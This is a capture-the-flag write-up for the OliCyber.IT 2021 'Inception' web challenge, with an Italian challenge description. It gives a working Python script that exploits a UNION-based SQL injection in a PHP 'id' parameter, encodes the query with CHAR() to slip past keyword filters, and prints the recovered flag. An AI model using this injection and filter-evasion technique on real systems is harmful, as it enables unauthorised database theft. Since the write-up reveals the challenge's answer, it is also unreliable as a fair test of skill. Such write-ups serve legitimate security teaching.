#   OliCyber.IT 2021 - DEMO Competizione nazionale

# Inception – Writeup

## Challenge Description
Sembra che dei fan del film Inception abbiano creato un sito, un uccellino mi ha detto che c'è una tabella con la flag, riesci a procurarmela?

Sito: http://inception.challs.olicyber.it

---
## Vulnerability
The web application exposes a parameter vulnerable to SQL injection. By crafting a `UNION SELECT` query, we can extract the flag directly from the database.

---
## Exploit
```python
import requests
import re

URL = 'http://inception.challs.olicyber.it/'

def encode(query):
    vuln = 'CHAR('
    for i in query:
        vuln += str(ord(i)) + ", "
    vuln = vuln[:-2] + ")"
    return vuln

payload = requests.get(f"{URL}see.php?id=0 UNION SELECT {encode('0 UNION SELECT flag FROM flag -- ')},null,null -- -").text
flag = re.findall(r'flag\{.*?}', payload)
if flag:
    print(flag[0])
````
---
## Code Analysis

1. **Target Endpoint**
   The injection point is the parameter `id` in `see.php`.

2. **Encoding Function**

   * The function `encode(query)` converts the payload into ASCII values.
   * Example: `"A"` → `CHAR(65)`.
   * Wrapping the query inside `CHAR(...)` helps bypass filters that block raw SQL keywords.

3. **Payload Construction**

   * The injected query is:

     ```
     0 UNION SELECT flag FROM flag -- 
     ```
   * This is encoded as a `CHAR(...)` expression and injected into the first column.
   * The remaining columns are filled with `null` to match the table structure.

4. **Response Handling**

   * The request is sent to the server.
   * A regex searches for the `flag{...}` pattern in the response body.
   * If found, the flag is printed.
---
## Exploitation Steps

1. Identify the injectable parameter (`id`).
2. Build a `UNION SELECT` payload to query the `flag` table.
3. Encode the payload as ASCII `CHAR(...)` to avoid keyword filters.
4. Inject the payload and send the request.
5. Extract the flag from the response.
---
## Solution

Running the exploit retrieves the flag:

```
flag{0h_b0y_1t_w4s_h4rd_r1ght?}
```
---
## Key Takeaway

This challenge demonstrates a **UNION-based SQL Injection**. By leveraging the ability to encode payloads as ASCII characters (`CHAR()`), we can bypass naive filters and directly exfiltrate sensitive data such as flags.
